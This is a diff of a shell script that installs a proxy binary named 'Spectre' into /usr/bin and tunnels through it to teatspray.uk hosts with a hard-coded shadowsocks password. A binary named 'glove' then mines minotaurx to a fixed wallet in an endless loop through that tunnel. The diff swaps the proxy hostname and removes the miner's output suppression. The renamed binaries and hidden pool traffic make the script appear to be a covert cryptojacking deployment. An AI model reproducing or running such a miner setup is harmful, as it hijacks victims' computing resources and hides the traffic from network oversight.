@@ -69,7 +69,7 @@ mv Spectre /usr/bin
 
 sleep 2
 
-Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@xneeshade$(shuf -i 1-6 -n 1).teatspray.uk:8443 &
+Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:8443 &
 
 sleep 2
 
@@ -100,6 +100,6 @@ sleep 2
 
 while true
 do
-./glove -a minotaurx -o stratum+tcp://xneepool.teatspray.uk:8442 -u MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate -p x -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
+./glove -a minotaurx -o stratum+tcp://xneepool.teatspray.uk:8442 -u MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate -p x -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082
 sleep 10
 done
